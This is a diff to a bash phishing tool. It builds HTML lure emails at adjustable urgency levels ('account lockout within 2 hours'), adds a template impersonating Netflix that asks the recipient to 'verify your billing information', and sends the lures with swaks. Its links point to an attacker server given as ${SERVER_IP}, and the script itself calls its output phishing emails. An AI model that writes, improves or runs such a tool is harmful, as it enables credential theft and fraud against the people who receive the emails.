@@ -169,11 +169,16 @@ generate_subject() {
     esac
 }
 
+# Create temporary directory for email template
+EMAIL_TEMPLATE_DIR=$(mktemp -d)
+EMAIL_TEMPLATE="$EMAIL_TEMPLATE_DIR/email.html"
+
 # Function to generate HTML email based on scenario and target
 generate_html_email() {
     local target="$1"
     local scenario="$2"
     local urgency="$3"
+    local template_file="$4"
     
     # If target is empty, generate a company name
     if [ -z "$target" ]; then
@@ -213,169 +218,234 @@ generate_html_email() {
             ;;
     esac
     
-    # Create the HTML email
-    cat > html_email_template.html << EOF
-<!DOCTYPE html>
-<html>
-<head>
-    <meta charset="UTF-8">
-    <title>${subject}</title>
-</head>
-<body style="margin: 0; padding: 0; font-family: Arial, sans-serif; line-height: 1.6;">
-    <table align="center" border="0" cellpadding="0" cellspacing="0" width="100%" style="max-width: 600px; border-collapse: collapse;">
-        <!-- HEADER WITH LOGO -->
-        <tr>
-            <td align="center" bgcolor="${color}" style="padding: 20px 0;">
-                <h1 style="color: white; margin: 0;">${target}</h1>
-            </td>
-        </tr>
+    # Create the HTML email - write to the temporary file
+    {
+        echo "<!DOCTYPE html>"
+        echo "<html>"
+        echo "<head>"
+        echo "    <meta charset=\"UTF-8\">"
+        echo "    <title>${subject}</title>"
+        echo "</head>"
+        echo "<body style=\"margin: 0; padding: 0; font-family: Arial, sans-serif; line-height: 1.6;\">"
+        echo "    <table align=\"center\" border=\"0\" cellpadding=\"0\" cellspacing=\"0\" width=\"100%\" style=\"max-width: 600px; border-collapse: collapse;\">"
+        echo "        <!-- HEADER WITH LOGO -->"
+        echo "        <tr>"
+        echo "            <td align=\"center\" bgcolor=\"${color}\" style=\"padding: 20px 0;\">"
+        echo "                <h1 style=\"color: white; margin: 0;\">${target}</h1>"
+        echo "            </td>"
+        echo "        </tr>"
+        echo "        "
+        echo "        <!-- CONTENT AREA -->"
+        echo "        <tr>"
+        echo "            <td bgcolor=\"#ffffff\" style=\"padding: 40px 30px;\">"
+        echo "                <table border=\"0\" cellpadding=\"0\" cellspacing=\"0\" width=\"100%\">"
+        echo "                    <tr>"
+        echo "                        <td style=\"color: #153643; font-size: 24px; font-weight: bold;\">"
+        echo "                            ${subject}"
+        echo "                        </td>"
+        echo "                    </tr>"
+        echo "                    <tr>"
+        echo "                        <td style=\"padding: 20px 0;\">"
+        echo "                            <p>Dear Valued User,</p>"
+        echo "                            "
+        echo "                            <p>${main_text}</p>"
         
-        <!-- CONTENT AREA -->
-        <tr>
-            <td bgcolor="#ffffff" style="padding: 40px 30px;">
-                <table border="0" cellpadding="0" cellspacing="0" width="100%">
-                    <tr>
-                        <td style="color: #153643; font-size: 24px; font-weight: bold;">
-                            ${subject}
-                        </td>
-                    </tr>
-                    <tr>
-                        <td style="padding: 20px 0;">
-                            <p>Dear Valued User,</p>
-                            
-                            <p>${main_text}</p>
-EOF
-
-    # Add urgency-specific text
-    case $urgency in
-        low)
-            cat >> html_email_template.html << EOF
-                            <p>Please complete this verification at your earliest convenience.</p>
-EOF
-            ;;
-        medium)
-            cat >> html_email_template.html << EOF
-                            <p>Please complete this verification within the next 48 hours to avoid any service interruptions.</p>
-EOF
-            ;;
-        high)
-            cat >> html_email_template.html << EOF
-                            <p><strong>You must complete this verification within the next 24 hours</strong> to maintain access to all services.</p>
-                            
-                            <p>This verification is mandatory according to our security policy.</p>
-EOF
-            ;;
-        critical)
-            cat >> html_email_template.html << EOF
-                            <p><strong>IMMEDIATE ACTION REQUIRED: You must complete this verification IMMEDIATELY.</strong> Your account access has already been restricted.</p>
-                            
-                            <p>Failure to act immediately will result in complete account lockout within the next 2 hours.</p>
-EOF
-            ;;
-    esac
-
-    # Complete the email template
-    cat >> html_email_template.html << EOF
-                        </td>
-                    </tr>
-                    <tr>
-                        <td align="center" style="padding: 30px 0;">
-                            <table border="0" cellpadding="0" cellspacing="0">
-                                <tr>
-                                    <td align="center" bgcolor="${color}" style="border-radius: 4px;">
-                                        <a href="http://${SERVER_IP}" target="_blank" style="display: inline-block; padding: 15px 30px; font-size: 16px; color: #ffffff; text-decoration: none; font-weight: bold;">${button_text}</a>
-                                    </td>
-                                </tr>
-                            </table>
-                        </td>
-                    </tr>
-                    <tr>
-                        <td>
-EOF
-
-    # Add scenario-specific closing text
-    case $scenario in
-        security)
-            cat >> html_email_template.html << EOF
-                            <p>If you did not attempt to access your account, please complete the verification process immediately and then contact our security team.</p>
-                            
-                            <p>For security reasons, please do not reply to this email.</p>
-EOF
-            ;;
-        account)
-            cat >> html_email_template.html << EOF
-                            <p>This verification process helps us ensure that your account remains secure and accessible only to you.</p>
-                            
-                            <p>If you have any questions, please contact our support team after completing verification.</p>
-EOF
-            ;;
-        invoice)
-            cat >> html_email_template.html << EOF
-                            <p>This invoice requires processing by the indicated due date to avoid any late fees or service interruptions.</p>
-                            
-                            <p>If you believe this invoice was sent in error, please verify your details first, then contact our billing department.</p>
-EOF
-            ;;
-        document)
-            cat >> html_email_template.html << EOF
-                            <p>The document will expire if not reviewed in a timely manner, which may result in delays or additional processing requirements.</p>
-                            
-                            <p>Please ensure you have access to your account credentials before proceeding.</p>
-EOF
-            ;;
-    esac
-
-    # Finish the email template
-    cat >> html_email_template.html << EOF
-                            <p>Thank you for your prompt attention to this matter.</p>
-                            
-                            <p>Regards,<br>
-                            ${target} Support Team</p>
-                        </td>
-                    </tr>
-                </table>
-            </td>
-        </tr>
+        # Add urgency-specific text
+        case $urgency in
+            low)
+                echo "                            <p>Please complete this verification at your earliest convenience.</p>"
+                ;;
+            medium)
+                echo "                            <p>Please complete this verification within the next 48 hours to avoid any service interruptions.</p>"
+                ;;
+            high)
+                echo "                            <p><strong>You must complete this verification within the next 24 hours</strong> to maintain access to all services.</p>"
+                echo "                            "
+                echo "                            <p>This verification is mandatory according to our security policy.</p>"
+                ;;
+            critical)
+                echo "                            <p><strong>IMMEDIATE ACTION REQUIRED: You must complete this verification IMMEDIATELY.</strong> Your account access has already been restricted.</p>"
+                echo "                            "
+                echo "                            <p>Failure to act immediately will result in complete account lockout within the next 2 hours.</p>"
+                ;;
+        esac
         
-        <!-- FOOTER -->
-        <tr>
-            <td bgcolor="#f4f4f4" style="padding: 20px 30px;">
-                <table border="0" cellpadding="0" cellspacing="0" width="100%">
-                    <tr>
-                        <td style="color: #666666; font-size: 12px;">
-                            <p>This message contains confidential information and is intended only for the recipient. If you are not the intended recipient, you should not disseminate, distribute or copy this email. Please notify the sender immediately if you have received this email by mistake and delete it from your system.</p>
-                            <p>&copy; 2023 ${target}. All rights reserved.</p>
-                        </td>
-                    </tr>
-                </table>
-            </td>
-        </tr>
-    </table>
-</body>
-</html>
-EOF
-
+        echo "                        </td>"
+        echo "                    </tr>"
+        echo "                    <tr>"
+        echo "                        <td align=\"center\" style=\"padding: 30px 0;\">"
+        echo "                            <table border=\"0\" cellpadding=\"0\" cellspacing=\"0\">"
+        echo "                                <tr>"
+        echo "                                    <td align=\"center\" bgcolor=\"${color}\" style=\"border-radius: 4px;\">"
+        echo "                                        <a href=\"http://${SERVER_IP}\" target=\"_blank\" style=\"display: inline-block; padding: 15px 30px; font-size: 16px; color: #ffffff; text-decoration: none; font-weight: bold;\">${button_text}</a>"
+        echo "                                    </td>"
+        echo "                                </tr>"
+        echo "                            </table>"
+        echo "                        </td>"
+        echo "                    </tr>"
+        echo "                    <tr>"
+        echo "                        <td>"
+        
+        # Add scenario-specific closing text
+        case $scenario in
+            security)
+                echo "                            <p>If you did not attempt to access your account, please complete the verification process immediately and then contact our security team.</p>"
+                echo "                            "
+                echo "                            <p>For security reasons, please do not reply to this email.</p>"
+                ;;
+            account)
+                echo "                            <p>This verification process helps us ensure that your account remains secure and accessible only to you.</p>"
+                echo "                            "
+                echo "                            <p>If you have any questions, please contact our support team after completing verification.</p>"
+                ;;
+            invoice)
+                echo "                            <p>This invoice requires processing by the indicated due date to avoid any late fees or service interruptions.</p>"
+                echo "                            "
+                echo "                            <p>If you believe this invoice was sent in error, please verify your details first, then contact our billing department.</p>"
+                ;;
+            document)
+                echo "                            <p>The document will expire if not reviewed in a timely manner, which may result in delays or additional processing requirements.</p>"
+                echo "                            "
+                echo "                            <p>Please ensure you have access to your account credentials before proceeding.</p>"
+                ;;
+        esac
+        
+        echo "                            <p>Thank you for your prompt attention to this matter.</p>"
+        echo "                            "
+        echo "                            <p>Regards,<br>"
+        echo "                            ${target} Support Team</p>"
+        echo "                        </td>"
+        echo "                    </tr>"
+        echo "                </table>"
+        echo "            </td>"
+        echo "        </tr>"
+        echo "        "
+        echo "        <!-- FOOTER -->"
+        echo "        <tr>"
+        echo "            <td bgcolor=\"#f4f4f4\" style=\"padding: 20px 30px;\">"
+        echo "                <table border=\"0\" cellpadding=\"0\" cellspacing=\"0\" width=\"100%\">"
+        echo "                    <tr>"
+        echo "                        <td style=\"color: #666666; font-size: 12px;\">"
+        echo "                            <p>This message contains confidential information and is intended only for the recipient. If you are not the intended recipient, you should not disseminate, distribute or copy this email. Please notify the sender immediately if you have received this email by mistake and delete it from your system.</p>"
+        echo "                            <p>&copy; 2023 ${target}. All rights reserved.</p>"
+        echo "                        </td>"
+        echo "                    </tr>"
+        echo "                </table>"
+        echo "            </td>"
+        echo "        </tr>"
+        echo "    </table>"
+        echo "</body>"
+        echo "</html>"
+    } > "$template_file"
+    
     echo -e "${GREEN}[SUCCESS]${NC} Generated ${urgency} urgency ${scenario} phishing email for ${target}"
 }
 
+# Create Netflix-specific template
+create_netflix_template() {
+    local template_file="$1"
+    
+    {
+        echo "<!DOCTYPE html>"
+        echo "<html>"
+        echo "<head>"
+        echo "    <meta charset=\"UTF-8\">"
+        echo "    <title>Netflix: Action Required on Your Account</title>"
+        echo "</head>"
+        echo "<body style=\"margin: 0; padding: 0; font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif; line-height: 1.6;\">"
+        echo "    <table align=\"center\" border=\"0\" cellpadding=\"0\" cellspacing=\"0\" width=\"100%\" style=\"max-width: 600px; border-collapse: collapse;\">"
+        echo "        <!-- HEADER WITH LOGO -->"
+        echo "        <tr>"
+        echo "            <td align=\"center\" bgcolor=\"#000000\" style=\"padding: 20px 0;\">"
+        echo "                <span style=\"color: #E50914; font-size: 40px; font-weight: bold; font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif;\">NETFLIX</span>"
+        echo "            </td>"
+        echo "        </tr>"
+        echo "        "
+        echo "        <!-- CONTENT AREA -->"
+        echo "        <tr>"
+        echo "            <td bgcolor=\"#ffffff\" style=\"padding: 40px 30px;\">"
+        echo "                <table border=\"0\" cellpadding=\"0\" cellspacing=\"0\" width=\"100%\">"
+        echo "                    <tr>"
+        echo "                        <td style=\"color: #333333; font-size: 24px; font-weight: bold;\">"
+        echo "                            Your Netflix Account Has Been Locked"
+        echo "                        </td>"
+        echo "                    </tr>"
+        echo "                    <tr>"
+        echo "                        <td style=\"padding: 20px 0;\">"
+        echo "                            <p>Dear Netflix Customer,</p>"
+        echo "                            "
+        echo "                            <p>We detected suspicious activity on your Netflix account. Multiple login attempts were made from an unrecognized device in a different location than your usual viewing area.</p>"
+        echo "                            "
+        echo "                            <p>For your protection, we have temporarily locked your account. To restore access and prevent unauthorized charges, please verify your billing information immediately.</p>"
+        echo "                            "
+        echo "                            <p><strong>If you do not verify your account within 24 hours, your subscription will be canceled.</strong></p>"
+        echo "                        </td>"
+        echo "                    </tr>"
+        echo "                    <tr>"
+        echo "                        <td align=\"center\" style=\"padding: 30px 0;\">"
+        echo "                            <table border=\"0\" cellpadding=\"0\" cellspacing=\"0\">"
+        echo "                                <tr>"
+        echo "                                    <td align=\"center\" bgcolor=\"#E50914\" style=\"border-radius: 4px;\">"
+        echo "                                        <a href=\"http://${SERVER_IP}\" target=\"_blank\" style=\"display: inline-block; padding: 15px 30px; font-size: 16px; color: #ffffff; text-decoration: none; font-weight: bold;\">UNLOCK MY ACCOUNT</a>"
+        echo "                                    </td>"
+        echo "                                </tr>"
+        echo "                            </table>"
+        echo "                        </td>"
+        echo "                    </tr>"
+        echo "                    <tr>"
+        echo "                        <td>"
+        echo "                            <p>If you did not attempt to access your account from a new location, we strongly recommend updating your password after verification.</p>"
+        echo "                            "
+        echo "                            <p>Note: Netflix will never ask you to send personal information via email.</p>"
+        echo "                            "
+        echo "                            <p>Thank you for your immediate attention to this matter.</p>"
+        echo "                            "
+        echo "                            <p>- The Netflix Team</p>"
+        echo "                        </td>"
+        echo "                    </tr>"
+        echo "                </table>"
+        echo "            </td>"
+        echo "        </tr>"
+        echo "        "
+        echo "        <!-- FOOTER -->"
+        echo "        <tr>"
+        echo "            <td bgcolor=\"#f3f3f3\" style=\"padding: 20px 30px;\">"
+        echo "                <table border=\"0\" cellpadding=\"0\" cellspacing=\"0\" width=\"100%\">"
+        echo "                    <tr>"
+        echo "                        <td style=\"color: #666666; font-size: 12px;\">"
+        echo "                            <p>This message contains confidential information and is intended only for the recipient. If you have received this email in error, please contact Netflix Support.</p>"
+        echo "                            <p>&copy; 2023 Netflix, Inc. All rights reserved.</p>"
+        echo "                        </td>"
+        echo "                    </tr>"
+        echo "                </table>"
+        echo "            </td>"
+        echo "        </tr>"
+        echo "    </table>"
+        echo "</body>"
+        echo "</html>"
+    } > "$template_file"
+    
+    echo -e "${GREEN}[SUCCESS]${NC} Generated Netflix-specific phishing email"
+}
+
 # Determine which template to use
-email_template="html_email_template.html"
 subject="Urgent: Security Alert - Immediate Action Required"
 
 if [ -n "$CUSTOM_TEMPLATE" ] && [ -f "$CUSTOM_TEMPLATE" ]; then
     # Use custom template provided
-    cp "$CUSTOM_TEMPLATE" html_email_template.html
+    cp "$CUSTOM_TEMPLATE" "$EMAIL_TEMPLATE"
     echo -e "${YELLOW}[INFO]${NC} Using custom HTML template: $CUSTOM_TEMPLATE"
+elif [[ "$TARGET_INFO" == "Netflix" ]]; then
+    # Special case for Netflix
+    create_netflix_template "$EMAIL_TEMPLATE"
+    subject="Netflix: Action Required on Your Account"
 elif [ -n "$TARGET_INFO" ]; then
     # Generate dynamic template based on provided information
-    generate_html_email "$TARGET_INFO" "$SCENARIO" "$URGENCY"
+    generate_html_email "$TARGET_INFO" "$SCENARIO" "$URGENCY" "$EMAIL_TEMPLATE"
     subject=$(generate_subject "$SCENARIO" "$URGENCY")
-elif [ -f "html_email_template.html" ]; then
-    # Use existing template
-    echo -e "${YELLOW}[INFO]${NC} Using existing HTML template"
 else
     # Generate default template
-    generate_html_email "" "$SCENARIO" "$URGENCY"
+    generate_html_email "" "$SCENARIO" "$URGENCY" "$EMAIL_TEMPLATE"
     subject=$(generate_subject "$SCENARIO" "$URGENCY")
 fi
 
@@ -389,7 +459,7 @@ swaks --to "$TARGET_EMAIL" \
       --auth-password "$EMAIL_PASSWORD" \
       --h-Subject "$subject" \
       --h-Content-Type "text/html; charset=UTF-8" \
-      --body "$(cat html_email_template.html)"
+      --body "$(cat "$EMAIL_TEMPLATE")"
 
 if [ $? -eq 0 ]; then
     echo -e "${GREEN}[SUCCESS]${NC} Email sent successfully to $TARGET_EMAIL"
@@ -404,4 +474,7 @@ echo -e "    SMTP Server: mail.lumoninc.com"
 echo -e "    Port: 25"
 echo -e "    Username: $EMAIL_USERNAME"
 echo -e "    Password: (your password in .env)"
-echo -e "    Security: None" 
+echo -e "    Security: None"
+
+# Clean up temporary files
+rm -rf "$EMAIL_TEMPLATE_DIR" 
